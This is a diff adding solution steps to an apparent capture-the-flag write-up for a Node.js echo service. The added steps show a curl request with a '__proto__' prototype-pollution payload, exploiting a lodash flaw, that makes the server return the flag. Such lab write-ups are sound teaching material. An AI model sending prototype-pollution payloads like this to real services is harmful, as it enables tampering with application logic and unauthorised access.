@@ -45,10 +45,18 @@ $curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"m
 ***Response***
 {"userID":"::ffff:82.57.151.149","time":1651490382169,"message":"ping","flag":"disabled"} 
 
+If we take a look at the file index.js, we can see that the script will output the flag if the value of the flag is on true.
+
+
 We need to manipulate the object to retrive the flag using a vulnerabilities that we can find from the previous command: "snyk monitor"
 
 A good one could be prototipe pollution:
 
 https://security.snyk.io/vuln/SNYK-JS-LODASH-567746
 
+This could be a possible solution:
 
+$curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"message":"ping","__proto__":{"flag":"true"}}'  
+***Response***
+
+{"userID":"::ffff:82.57.151.149","time":1651497940769,"message":"ping","flag":"SNYK{FLAGTOFIND}"} 
